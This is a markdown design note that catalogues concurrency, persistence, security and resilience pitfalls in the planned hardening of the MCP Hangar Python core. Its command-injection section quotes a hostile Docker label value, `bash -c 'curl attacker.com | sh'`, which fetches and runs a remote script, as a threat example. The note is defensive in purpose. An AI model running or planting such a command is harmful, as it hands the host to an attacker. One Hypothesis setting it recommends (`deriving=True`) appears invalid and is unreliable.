# Domain Pitfalls

**Domain:** Production hardening for MCP Hangar Python core (v1.0)
**Researched:** 2026-03-08
**Applies to:** v1.0 milestone -- concurrency safety, persistence (saga, circuit breaker, snapshots), security (command validation, rate limiting), resilience (health backoff, Docker discovery), code quality (exception hygiene, typing, property-based testing)

---

## Critical Pitfalls

Mistakes that cause production incidents, data loss, or deadlocks.

### Pitfall 1: I/O-Under-Lock Removal Introduces TOCTOU Races

**What goes wrong:** `_refresh_tools()` is called inside `invoke_tool()` while holding `Provider._lock`. The naive fix -- moving `_refresh_tools()` outside the lock -- introduces a TOCTOU (time-of-check-time-of-use) race: between releasing the lock and calling the client, another thread can transition the provider to DEAD or COLD, invalidating the client reference.

**Why it happens:** The lock currently serves two purposes: (1) protecting state invariants (correct) and (2) serializing I/O operations (incorrect but safe). Removing purpose (2) without accounting for state changes during the I/O window breaks the assumption that the client reference remains valid.

**Consequences:**

- `NoneType` errors when client reference is invalidated between lock release and I/O
- Tool invocations sent to a provider that has transitioned to DEAD
- Spurious `ProviderNotReadyError` on concurrent requests during state transitions

**Prevention:**

1. Use the copy-reference-under-lock pattern already documented in `CLAUDE.md`: acquire lock, verify state is READY, copy client reference, release lock, then do I/O. This is safe because state transitions that invalidate the client must also acquire the lock.
2. For `_refresh_tools()`: separate into two phases -- (a) under lock: check if refresh is needed and copy client ref, (b) outside lock: call client for tools list, (c) re-acquire lock: update tools registry.
3. For `_start()`: use `INITIALIZING` state as a guard. Set state to `INITIALIZING` under lock, release lock, do process creation and MCP handshake, re-acquire lock, set state to `READY`. Other threads seeing `INITIALIZING` should wait (use `threading.Event`) rather than attempting concurrent starts.
4. Do NOT simply move `_start()` outside the lock without a state guard -- concurrent `ensure_ready()` calls will attempt parallel starts.

**Detection:**

- `TrackedLock` warnings about long lock holds (>5s suggests I/O under lock)
- Thread dumps showing multiple threads blocked on `Provider._lock` during cold starts
- Sporadic `ClientNotConnectedError` during concurrent tool invocations

---

### Pitfall 2: `_start()` I/O Under Lock Blocks ALL Threads for 30+ Seconds

**What goes wrong:** `Provider._start()` performs subprocess creation, MCP handshake, and tool discovery while holding `Provider._lock`. Cold starts take 1-30 seconds depending on the provider. ALL other threads attempting ANY operation on this provider (tool invocation, health check, status query) block for the entire duration.

**Why it happens:** The current code uses the lock to prevent concurrent starts, which is correct. But it holds the lock for the entire startup sequence, which includes I/O (process spawn, stdin/stdout communication, tool listing).

**Consequences:**

- Health check timeouts for providers sharing the same `BackgroundWorker` thread
- Request latency spikes when one provider cold-starts while others are waiting
- At scale (50+ providers), a restart cascade can effectively serialize all startup, taking minutes instead of seconds

**Prevention:**

1. Transition to `INITIALIZING` under lock (sub-millisecond), release lock immediately.
2. Perform process creation and MCP handshake without lock.
3. Re-acquire lock to finalize state to `READY` and register tools.
4. Use `threading.Event` (one per provider) so callers waiting for initialization can block on the event rather than polling or lock-contending.
5. `ensure_ready()` should check: if state is `INITIALIZING`, wait on the event with timeout. If state is `COLD`, attempt start. If state is `READY`, proceed.

**Detection:**

- Cold start latency >5s in metrics (`mcp_hangar_cold_starts_total` with duration histogram)
- Multiple threads showing same `Provider._lock` in thread dump

---

### Pitfall 3: Bare `except` Crash Loops in Background Workers

**What goes wrong:** The codebase has 42 bare `except Exception:` catches. Enabling ruff BLE001 (bare-except enforcement) and uniformly replacing them with specific exceptions causes `BackgroundWorker._loop()` to crash on the first unhandled exception type, permanently killing GC or health check workers with no restart mechanism.

**Why it happens:** There are three categories of bare excepts that require different treatment: (a) **Fault barriers** in background loops that MUST catch broadly to survive unexpected errors (`BackgroundWorker._loop()`, event handler dispatch), (b) **Cleanup paths** that should narrow to specific exceptions (`_cleanup_process()`, `_stop_container()`), and (c) **Bug-hiding catches** that silently swallow errors that should propagate (`_begin_cold_start_tracking`, metrics publish). Treating all three the same way is wrong.

**Consequences:**

- Category (a) treated as (c): Background workers crash on first `KeyError`, `AttributeError`, or other unexpected exception. No restart -> health checks stop, GC stops, providers never get cleaned up.
- Category (c) treated as (a): Real bugs continue to be hidden. Lock deadlocks, state machine violations, and resource leaks go undetected.

**Prevention:**

1. **Audit and categorize ALL 42 instances BEFORE enabling BLE001.** Create a spreadsheet/checklist.
2. **Fault barriers** (background loops): Keep broad catch but add `except Exception as e:` with structured logging. Add a comment `# fault-barrier: intentionally broad` so future BLE001 runs can be configured to skip these.
3. **Cleanup paths**: Narrow to the specific exceptions that can occur (`OSError`, `ProcessLookupError`, `DockerException`). Log and continue.
4. **Bug-hiding catches**: Remove entirely. Let the exception propagate. If it causes a crash, that crash reveals a real bug that needs fixing.
5. Enable BLE001 AFTER the categorization and fix, not before.

**Detection:**

- `ruff check --select BLE001` shows all 42 instances with file:line
- `BackgroundWorker` stops emitting health check metrics (worker died silently)
- Provider GC stops running (providers accumulate in DEAD state forever)

---

### Pitfall 4: Command Injection via Discovery Sources

**What goes wrong:** `DockerDiscoverySource._parse_container()` (line 206) does `connection_info["command"] = cmd.split()` from Docker container labels with ZERO validation. A malicious or misconfigured Docker label can inject arbitrary commands: `mcp-hangar.command: "bash -c 'curl attacker.com | sh'"`.

**Why it happens:** `InputValidator.validate_command()` exists and works with allowlist/blocklist and `DANGEROUS_PATTERNS` regex matching. But the discovery pipeline completely bypasses it. The validator is only called from `server/validation.py` for manually-configured providers.

**Consequences:**

- Arbitrary code execution with the privileges of the MCP Hangar process
- Lateral movement from a compromised container to the host via malicious discovery labels
- Data exfiltration through discovery-sourced commands that phone home

**Prevention:**

1. Wire `InputValidator.validate_command()` into the discovery pipeline BEFORE provider registration.
2. Apply validation in `DiscoverySource.on_provider_discovered()` (base class hook) so ALL discovery sources get validation automatically.
3. Default policy: **deny-by-default for discovery-sourced providers.** Commands from discovery must match an explicit allowlist. Static config commands are trusted (admin wrote them).
4. Log and emit domain event (`DiscoveryCommandRejected`) when validation fails, with full context for debugging.

**Detection:**

- Review Docker labels on all containers in the environment: `docker inspect --format '{{ .Config.Labels }}' $(docker ps -q) | grep mcp-hangar`
- Audit `DiscoveredProvider` registrations in structured logs for unexpected command patterns
- No validation failures logged = validation not wired in (the pitfall itself)

---

### Pitfall 5: Snapshot Version Mismatch Causes Silent Data Corruption

**What goes wrong:** Snapshot save and event append are not in the same transaction. When `EventSourcedProviderRepository._create_snapshot()` saves a snapshot at version N, concurrent operations can append events at version N+1, N+2, etc. On next load, the snapshot says "version N" but events from version N+1 onward may include operations that conflict with the snapshot state.

**Why it happens:** `_create_snapshot()` is called from the repository after appending events, but not inside the same database transaction as the event append. The snapshot captures aggregate state at the moment of call, but the event store may have advanced since the aggregate was loaded.

**Consequences:**

- Snapshot says provider is READY at version 10, but events 11-12 transition it to DEGRADED then back to READY with different tool set
- On replay from snapshot: load snapshot (READY, version 10) -> replay events 11+ -> correct state
- But if snapshot version is WRONG (says 10 but aggregate was actually at 8): replay from 9 includes events already reflected in snapshot -> double-applied state changes -> corrupted aggregate

**Prevention:**

1. Save snapshots inside `EventStore.append()` lock scope to ensure snapshot version matches the actual stream version at that point.
2. Add version consistency check in `from_snapshot()`: after loading snapshot and replaying remaining events, verify the final aggregate version matches `len(all_events_in_stream)`.
3. If version mismatch detected, log error and fall back to full replay (discard snapshot).
4. Snapshot creation should be triggered AFTER successful event append, using the version returned by append, not the pre-append version.

**Detection:**

- Aggregate version after snapshot+replay does not match event stream length
- Provider state after restart differs from state before shutdown
- Add a startup consistency check: for each provider, compare snapshot-based load vs full replay load

---

### Pitfall 6: Saga Persistence Breaks Idempotency

**What goes wrong:** `ProviderRecoverySaga.handle()` has side effects: incrementing `_retry_state[provider_id]["consecutive_failures"]`, issuing `RestartProviderCommand`. These side effects are NOT idempotent. When saga state is persisted and replayed on restart, degraded providers get extra restart attempts, potentially exceeding `max_retries` immediately and transitioning to DEAD without actual retry.

**Why it happens:** `EventTriggeredSaga` (used by all 3 sagas) processes domain events and returns commands. The saga's internal state (retry counts, failure tracking) is modified during `handle()`. When replaying events on restart to rebuild saga state, these modifications happen again, duplicating counts.

**Consequences:**

- Provider has 2/3 retries, process restarts, saga replays 2 events, counter jumps to 4/3 -> provider declared DEAD without any actual retry attempt
- `GroupRebalanceSaga` double-issues `MoveProviderCommand`, moving a provider that was already moved -> provider assigned to wrong group
- `ProviderFailoverSaga` issues duplicate failover commands -> multiple providers started as replacement for one

**Prevention:**

1. Track `last_event_id` per saga in the checkpoint. On replay, skip events with ID <= last processed.
2. During saga restoration, set a `_replaying = True` flag that suppresses command emission. Events are processed to rebuild state but commands are not emitted.
3. After replay completes, clear `_replaying` flag. Subsequent events process normally.
4. Alternative: make saga steps fully idempotent by design -- `RestartProviderCommand` should be a no-op if provider is already in `INITIALIZING` or `READY` state. This is defense-in-depth, not a replacement for replay protection.
5. Test: create saga with 2 events processed, persist checkpoint, restore, verify retry count is 2 (not 4), verify no commands emitted during replay.

**Detection:**

- Provider transitions to DEAD immediately after restart with `max_retries` exceeded in logs but no actual restart attempts
- Duplicate commands in command bus audit log
- Saga retry count after restart exceeds expected count

---

### Pitfall 7: Stale Circuit Breaker State After Restart

**What goes wrong:** Circuit breaker state is persisted as OPEN with `opened_at` timestamp. On restart, the persisted OPEN state is restored, but the provider may have recovered during the downtime. The circuit breaker correctly enters OPEN but the `reset_timeout_s` may have already elapsed. The first `allow_request()` call will probe (correct behavior via `_should_reset()`), but if the provider was healthy during downtime, the circuit breaker forces unnecessary probe-mode behavior.

**Why it happens:** The circuit breaker persists state at the moment of state change, not at the moment of shutdown. The `opened_at` timestamp reflects when the breaker tripped, not when the process stopped. If the process was down for longer than `reset_timeout_s`, the breaker will correctly auto-transition to CLOSED on first `allow_request()` via `_should_reset()`. But the failure_count is also persisted, and if it was near the threshold, a single post-restart failure immediately re-opens the breaker.

**Consequences:**

- Minor: unnecessary probe-mode for already-recovered providers (self-correcting)
- Major: persisted `failure_count` near threshold causes immediate re-trip on single failure after restart, even if provider was healthy
- The combination of persisted OPEN state + persisted failure count + elapsed reset timeout creates unpredictable behavior

**Prevention:**

1. Persist failure count only, not `opened_at` timing. On restore, if state was OPEN and `reset_timeout_s` has elapsed since the checkpoint timestamp, transition to CLOSED with failure count preserved.
2. On restore, trigger an immediate health check for providers with persisted OPEN circuit breaker. Use the health check result to validate the persisted state.
3. Add a `staleness_threshold_s` configuration. If the process was down longer than this threshold, reset circuit breaker state entirely (assume environment has changed).
4. Log clearly when circuit breaker state is restored vs. reset on startup, so operators can trace behavior.

**Detection:**

- Provider marked as circuit-breaker-OPEN immediately after restart, even though it's actually healthy
- Logs showing circuit breaker restored from checkpoint with stale timestamp
- Rate of circuit breaker state changes spikes immediately after restart

---

## Moderate Pitfalls

### Pitfall 8: Health Check Backoff Interaction With Saga Recovery

**What goes wrong:** When a provider degrades, two systems react: (1) `HealthTracker` applies exponential backoff to health checks (up to 60s), and (2) `ProviderRecoverySaga` schedules restart attempts with its own backoff. If the health check backoff and saga backoff are not coordinated, the combined worst-case is 120 seconds of no activity: health checker waits 60s (backoff), saga waits 60s (its own backoff). The provider appears abandoned.

**Why it happens:** `HealthTracker._calculate_backoff()` and `BackoffStrategy.calculate_backoff()` in `retry.py` are independent systems with independent time tracking. Neither knows about the other's backoff schedule. The `BackgroundWorker` health check loop and the `SagaManager` event handling loop run on separate threads with no shared time coordination.

**Consequences:**

- DEGRADED provider has 2-minute gap between last health check and saga retry attempt
- Operators see provider stuck in DEGRADED with no visible recovery activity
- SLA violations for providers with tight recovery time requirements

**Prevention:**

1. Document the combined worst-case delay explicitly: health backoff (up to `max_interval`) + saga backoff (up to `max_retry_delay`).
2. Set compatible limits: if health check max interval is 60s, saga max retry delay should be 30s (staggered).
3. Consider sharing a time source: when `HealthTracker` determines next check time, publish a domain event (`HealthCheckScheduled`) that the saga can observe to coordinate its own timing.
4. As minimum: add a metric `mcp_hangar_time_since_last_activity_seconds{provider_id}` that tracks maximum(health_check, saga_action, tool_invocation) so operators can detect idle periods.

### Pitfall 9: Rate Limiter Migration Creates Enforcement Gap

**What goes wrong:** Moving rate limiting from `server/validation.py` (current) to application-layer middleware (target) requires a non-atomic transition. If the old enforcement is removed before the new middleware is active, there's a window with no rate limiting. If both are active simultaneously, rate limits are double-counted.

**Why it happens:** The old enforcement calls `check_rate_limit()` directly in tool handlers. The new middleware wraps the command/query bus. Both use the same `InMemoryRateLimiter` instance. Running both means each request consumes 2 tokens instead of 1.

**Consequences:**

- Gap scenario: rate limiting disabled during deploy -> burst of requests overwhelms providers
- Double-count scenario: effective rate limit is halved -> legitimate requests rejected

**Prevention:**

1. **Atomic changeset**: add middleware AND remove old `check_rate_limit()` calls in the same commit. Test both before and after.
2. Use a feature flag: `rate_limit_enforcement: "legacy" | "middleware"` in config. Default to `"legacy"`. Switch to `"middleware"` explicitly. Remove `"legacy"` code path in a follow-up.
3. Verify with integration test: send exactly `rate_limit` requests, verify all succeed. Send `rate_limit + 1`, verify rejection. Run test against both enforcement modes.
4. Keep identical rate limit keys between old and new enforcement. Different key schemes = different buckets = inconsistent limits.

### Pitfall 10: ProviderGroup._try_start_member() Violates Lock Hierarchy

**What goes wrong:** `ProviderGroup._try_start_member()` acquires Provider lock (level 10) while holding ProviderGroup lock (level 11). The lock hierarchy requires level numbers to increase: you can acquire level 20 while holding level 10, but NOT level 10 while holding level 11. This creates deadlock risk.

**Why it happens:** `ProviderGroup._try_start_member()` calls `provider.ensure_ready()` (which acquires Provider._lock at level 10) while inside a method that holds `ProviderGroup._lock` (level 11). The lock hierarchy is: Provider(10) -> ProviderGroup(11). Calling from 11 back to 10 inverts the order.

**Consequences:**

- Thread A: holds Provider._lock (10) -> event handler -> `group.report_success()` -> tries ProviderGroup._lock (11) -- BLOCKS
- Thread B: holds ProviderGroup._lock (11) -> `_try_start_member()` -> `ensure_ready()` -> tries Provider._lock (10) -- BLOCKS
- Deadlock: both threads waiting for each other's lock, never released

**Prevention:**

1. Release ProviderGroup lock before calling `ensure_ready()`. Re-acquire after.
2. Change ProviderGroup to only schedule starts (queue the provider_id) rather than directly calling `ensure_ready()`. A separate thread/worker processes the start queue.
3. Audit ALL `ProviderGroup` methods for the same pattern. `start_all()` likely has the same issue.
4. `TrackedLock` should detect this at runtime if `LOCK_DEBUG=1` is set -- but it only warns if deadlock detection is enabled. Enable it in tests.

**Detection:**

- Process hangs with no activity (deadlock)
- Thread dump shows two threads each waiting for the other's lock
- `TrackedLock` warnings in logs about lock ordering violations (if detection is enabled)

### Pitfall 11: Docker Discovery Duplicates After Reconnection

**What goes wrong:** `DockerDiscoverySource` loses connection to Docker daemon, reconnects, and re-scans all containers. Containers that were already discovered and registered are discovered again. If the duplicate detection logic uses only container name (not container ID), a recreated container with the same name but different ID appears as the same provider, inheriting stale state.

**Why it happens:** Docker containers can be recreated with the same name but different IDs (common in CI/CD). The discovery source may track "known providers" by name, but the actual container identity changes. After reconnection, the discovery source sees all containers as if discovered for the first time.

**Consequences:**

- Duplicate provider registration attempts -> error noise in logs
- Stale provider entry (old container ID) coexists with new entry (new container ID) -> tool invocations routed to dead container
- Provider count metrics double during reconnection scan

**Prevention:**

1. Track containers by ID, not just name. Use a composite key: `{container_id}:{container_name}`.
2. On reconnection, perform a full reconciliation: compare newly discovered set against known set. Remove providers for containers that no longer exist. Add providers for new containers. Update providers for containers that changed.
3. Add a fingerprint to `DiscoveredProvider` that includes container ID, image hash, and label hash. Only re-register if fingerprint changes.
4. Emit `DiscoveryReconciliationCompleted` event with counts: added, removed, unchanged, updated.

### Pitfall 12: EventSourcedProvider Snapshot Value Object Deserialization

**What goes wrong:** `ProviderSnapshot.from_dict()` deserializes snapshot data into the `ProviderSnapshot` dataclass. If the snapshot contains value objects (e.g., `ProviderId`, `ProviderMode`, `IdleTTL`), `from_dict()` must reconstruct them using value object constructors. Using raw primitive values instead of value object constructors bypasses validation and creates objects that behave incorrectly.

**Why it happens:** `to_dict()` serializes value objects to their primitive representations (string, int). `from_dict()` must reverse this. If `from_dict()` does `provider_id = data["provider_id"]` instead of `provider_id = ProviderId(data["provider_id"])`, the result is a string where the domain expects a `ProviderId` value object.

**Consequences:**

- Type errors in code that expects value objects: `ProviderId.__eq__()` fails when comparing to raw string
- Validation bypass: `ProviderId("invalid/chars")` would be caught by constructor, but raw string passes through
- Subtle bugs: `ProviderMode.normalize()` not called, so `"container"` is not normalized to `DOCKER`

**Prevention:**

1. `from_dict()` MUST use value object constructors for all domain values: `ProviderId(data["provider_id"])`, `ProviderMode.normalize(data["mode"])`, `IdleTTL(data["idle_ttl_s"])`.
2. Add a round-trip test: `assert Provider.from_snapshot(provider.to_snapshot()) == provider` for every serializable aggregate.
3. Consider adding a `__post_init__` check on `ProviderSnapshot` that validates all fields are the correct types (value objects, not primitives).

---

## Minor Pitfalls

### Pitfall 13: Property-Based Test Reproducibility

**What goes wrong:** Hypothesis-generated test failures cannot be reproduced because the CI environment doesn't configure deterministic database settings and the Hypothesis database is not persisted between CI runs.

**Why it happens:** Hypothesis stores its example database (`.hypothesis/` directory) locally. In CI, this directory is ephemeral. When a property-based test finds a failing case, the next CI run cannot reproduce it because the counterexample database is lost.

**Prevention:**

1. Configure Hypothesis profiles in `conftest.py`: `settings.register_profile("ci", max_examples=50, database=DirectoryBasedExampleDatabase(".hypothesis"))`. Cache `.hypothesis/` in CI.
2. When a test failure is found, add the specific failing input as an explicit `@example(...)` decorator so it's permanent.
3. Set `HYPOTHESIS_SEED` environment variable in CI for deterministic reproduction.
4. Use `@settings(deriving=True)` to inherit from the profile while allowing per-test overrides.

### Pitfall 14: py.typed Marker Exposes All Type Errors

**What goes wrong:** Adding the `py.typed` marker file to the package tells type checkers (mypy, pyright) that this package provides inline types. Users and CI then see ALL type errors in the package -- including the existing ones. If the package has many type errors, the `py.typed` marker makes the package appear low-quality to consumers.

**Why it happens:** The `py.typed` marker is a PEP 561 signal. Without it, type checkers treat the package as untyped and suppress errors. With it, every `Any`, missing annotation, and type inconsistency becomes visible.

**Prevention:**

1. Fix ALL mypy errors BEFORE adding the `py.typed` marker. Enable mypy strictness incrementally: `check_untyped_defs` first, then `no_implicit_optional`, then `disallow_incomplete_defs`.
2. Run `mypy --strict packages/core/mcp_hangar/` and fix all errors before shipping `py.typed`.
3. Add `py.typed` in the LAST commit of the typing phase, not the first.

### Pitfall 15: Lock Hierarchy Violations Not Caught in Production

**What goes wrong:** `TrackedLock` detects lock ordering violations at runtime via debug logging, but this detection is only active when `LOCK_DEBUG` environment variable is set. In production, lock hierarchy violations are silent -- they only manifest as occasional deadlocks under load.

**Why it happens:** Lock hierarchy checking adds overhead (tracking which locks each thread holds, validating ordering on acquire). This overhead is disabled by default for production performance.

**Consequences:**

- New code introduced in hardening phases may violate lock hierarchy without detection
- Violations only surface as production deadlocks, which are extremely difficult to debug

**Prevention:**

1. Enable `LOCK_DEBUG=1` in ALL test environments (unit, integration, CI).
2. Add a test that exercises concurrent operations and verifies zero lock hierarchy warnings in logs.
3. Consider a lightweight production mode: instead of full hierarchy checking, log a warning (not error) on potential violations without the full tracking overhead.
4. Code review checklist: every new `TrackedLock.acquire()` call site must document which lock level it's acquiring and what locks it already holds.

### Pitfall 16: Singleton Testing Issues With New Components

**What goes wrong:** The codebase uses global singletons (`get_event_store()`, `get_saga_manager()`, `get_command_bus()`) with `set_*()` functions for test injection. New components (saga store, circuit breaker store, rate limit middleware) might follow the same pattern, creating more testing friction -- tests must remember to reset singletons between test cases or risk cross-test contamination.

**Why it happens:** The singleton pattern exists for backward compatibility in the existing codebase. It's tempting to copy the pattern for new components because it's familiar.

**Consequences:**

- Test A sets `set_saga_store(mock_store)`, Test B forgets to reset it, Test B uses the mock from Test A
- Parallel test execution becomes impossible (singletons are global mutable state)
- Each new singleton adds another `set_*(None)` call to the test teardown boilerplate

**Prevention:**

1. Do NOT create new singletons. Wire ALL new components through `bootstrap()/ApplicationContext` and constructor injection.
2. For tests, create fresh component instances per test. No `set_*()` functions.
3. The existing singletons exist for backward compatibility. They should not be copied for new code.
4. `CLAUDE.md` explicitly states: "Don't use global mutable state (use DI)."

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation | Severity |
|---|---|---|---|
| Concurrency safety (P0) | TOCTOU races from I/O-under-lock removal (Pitfall 1) | Copy-ref pattern, `INITIALIZING` state guard, `threading.Event` for waiters | Critical |
| Concurrency safety (P0) | `_start()` blocking all threads (Pitfall 2) | State guard + event pattern, not raw lock-removal | Critical |
| Concurrency safety (P0) | ProviderGroup lock hierarchy violation (Pitfall 10) | Release group lock before `ensure_ready()`, audit all group methods | Moderate |
| Exception hygiene (P0) | Crash loops from blind BLE001 enforcement (Pitfall 3) | Categorize 42 instances BEFORE enabling rule | Critical |
| Command injection prevention (P0) | Unvalidated discovery commands (Pitfall 4) | Wire `InputValidator` into discovery base class | Critical |
| Saga persistence (P1) | Idempotency broken on replay (Pitfall 6) | Track `last_event_id`, `_replaying` flag, suppress commands during replay | Critical |
| Circuit breaker persistence (P1) | Stale state after restart (Pitfall 7) | Persist failure count only, health-check on restore, staleness threshold | Moderate |
| Health check backoff (P2) | Backoff-on-backoff with saga recovery (Pitfall 8) | Document combined delay, set compatible limits, consider shared time source | Moderate |
| Event store snapshots (P2) | Version mismatch corruption (Pitfall 5) | Save snapshots inside event store lock scope, add version consistency check | Critical |
| Rate limiter middleware (P2) | Enforcement gap during migration (Pitfall 9) | Atomic changeset: add middleware + remove old enforcement in same commit | Moderate |
| Docker discovery resilience (P2) | Duplicate providers after reconnection (Pitfall 11) | Track by container ID + fingerprint, full reconciliation on reconnect | Moderate |
| Event store snapshots (P2) | Value object deserialization bypass (Pitfall 12) | Use value object constructors in `from_dict()`, add round-trip tests | Moderate |
| Property-based testing (P2) | Non-reproducible failures in CI (Pitfall 13) | Cache `.hypothesis/`, add explicit `@example()` decorators | Minor |
| Typing / code quality (P2) | `py.typed` exposes all type errors (Pitfall 14) | Fix mypy errors BEFORE adding marker | Minor |
| Cross-cutting | Lock hierarchy violations undetected in prod (Pitfall 15) | Enable `LOCK_DEBUG=1` in all test environments | Minor |
| Cross-cutting | Singleton proliferation for new components (Pitfall 16) | No new singletons; use constructor injection via bootstrap | Minor |

---

## "Looks Done But Isn't" Checklist

These are conditions that pass basic testing but fail in production or edge cases.

- [ ] **I/O extracted from lock scope** -- but did you test concurrent `invoke_tool()` + `_stop()` on the same provider? The client ref can be invalidated between copy and use if stop doesn't wait for in-flight calls.
- [ ] **Bare excepts replaced** -- but did you verify `BackgroundWorker._loop()` still survives unexpected errors? A `KeyError` in health check code should not kill the health check worker permanently.
- [ ] **Discovery commands validated** -- but did you test with environment variable expansion in commands? `${HOME}/malicious` passes allowlist for `bash` but `${HOME}` resolves to something unexpected.
- [ ] **Saga persists checkpoints** -- but did you test what happens when the checkpoint write itself fails (SQLite disk full, WAL corruption)? The saga should continue operating in-memory, not crash.
- [ ] **Circuit breaker state restored** -- but did you test with a `reset_timeout_s` that elapsed during process downtime? The breaker should auto-close on first `allow_request()`, not stay OPEN.
- [ ] **Snapshot creates successfully** -- but did you verify snapshot version matches the event stream version? A mismatch means events will be double-applied on next load.
- [ ] **Health checks use backoff** -- but did you test the interaction with saga recovery? Combined worst-case is health backoff (60s) + saga backoff (60s) = 120s apparent inactivity.
- [ ] **Rate limiter middleware works** -- but did you remove the old `check_rate_limit()` calls? Both active = double-counting. Old removed without new = gap.
- [ ] **Property-based tests pass** -- but did you persist the Hypothesis database in CI? Without it, failing counterexamples are lost between runs.
- [ ] **`py.typed` marker added** -- but did you run `mypy --strict` against the entire package? The marker exposes ALL type errors to downstream consumers.
- [ ] **Docker discovery reconnects** -- but did you test what happens when the same container name exists with a different container ID? Stale provider entry coexists with new entry.

---

## Technical Debt Patterns to Avoid

### Pattern 1: Persisting Saga State in the Event Store

**Trap:** Using the existing event store to persist saga checkpoints as domain events. It seems convenient -- the event store already handles persistence, serialization, and versioning.

**Why bad:** Saga checkpoints are operational state, not domain events. They pollute event streams, interfere with aggregate replay, and create confusing versioning. Sagas are infrastructure-level orchestration, not domain behavior. Replaying saga checkpoints as domain events would corrupt aggregate state.

**Instead:** Use a dedicated `ISagaStore` with its own SQLite table. Clean separation of concerns.

### Pattern 2: Circuit Breaker as Independent Aggregate

**Trap:** Making `CircuitBreaker` a separate aggregate root with its own event stream, snapshot store, and repository.

**Why bad:** Circuit breaker is a child entity of Provider. It has no independent identity -- it exists only in the context of a provider. Separate streams mean separate versioning, separate snapshots, and cross-aggregate consistency challenges that don't need to exist.

**Instead:** Include circuit breaker state in `ProviderSnapshot`. Circuit breaker state changes can optionally emit Provider-level events.

### Pattern 3: Global Singletons for New Stores

**Trap:** Adding `_global_saga_store: SQLiteSagaStore | None = None` with `get_saga_store()` / `set_saga_store()` functions, copying the existing pattern from `get_event_store()`.

**Why bad:** Each singleton adds testing friction, hidden coupling, and makes parallel test execution impossible. The existing singletons exist for backward compatibility; creating more makes the problem worse.

**Instead:** Wire all new components through `bootstrap()/ApplicationContext` with constructor injection.

### Pattern 4: Rate Limiter With Transport Knowledge

**Trap:** Adding HTTP-aware rate limiting logic (headers, IP extraction, request parsing) to `domain/security/rate_limiter.py`.

**Why bad:** Domain layer must have NO external dependencies and no knowledge of transport. HTTP headers are a transport concern.

**Instead:** Domain provides `RateLimiter` (token bucket algorithm). Application provides `RateLimitMiddleware` (transport-agnostic scope + key). Server layer extracts HTTP-specific details and passes scope + key to middleware.

---

## Sources

- Direct codebase analysis of 20+ source files across domain, application, infrastructure, and server layers (HIGH confidence)
- `domain/model/provider.py`: `_refresh_tools()` under lock, `_start()` under lock, `VALID_TRANSITIONS` (HIGH confidence -- direct code analysis)
- `infrastructure/saga_manager.py`: in-memory-only `_active_sagas`, `_retry_state` dicts (HIGH confidence)
- `domain/model/circuit_breaker.py`: `to_dict()` serialization, `threading.Lock` not `TrackedLock` (HIGH confidence)
- `domain/security/input_validator.py`: `validate_command()` with allowlist/blocklist (HIGH confidence)
- `infrastructure/discovery/docker_source.py` line 206: raw `cmd.split()` with no validation (HIGH confidence)
- `domain/security/rate_limiter.py`: global singleton `_global_limiter` (HIGH confidence)
- `domain/model/health_tracker.py`: `_calculate_backoff()` with `min(60, 2^n)` (HIGH confidence)
- `infrastructure/lock_hierarchy.py`: `TrackedLock`, `LockLevel` enum (HIGH confidence)
- `CLAUDE.md`: lock hierarchy rules, forbidden patterns, layer dependencies (HIGH confidence)
- `grep -c 'except Exception' packages/core/` result: 42 instances (HIGH confidence)
- Python threading documentation for `threading.Event` pattern (HIGH confidence)
